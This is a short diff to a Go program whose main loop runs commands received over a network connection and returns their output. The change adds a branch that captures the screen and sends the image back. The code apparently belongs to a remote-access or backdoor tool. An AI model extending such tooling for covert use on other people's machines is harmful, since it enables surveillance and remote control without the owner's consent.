@@ -31,7 +31,8 @@ func main() {
 			send_msg(conn, "Connection closing :|")
 			conn.Close()
 		} else if cmd == "capturescr" {
-
+			result := "img:" + capture_scr()
+			send_msg(conn, result)
 		} else {
 			send_msg(conn, exec_cmd(cmd))
 		}
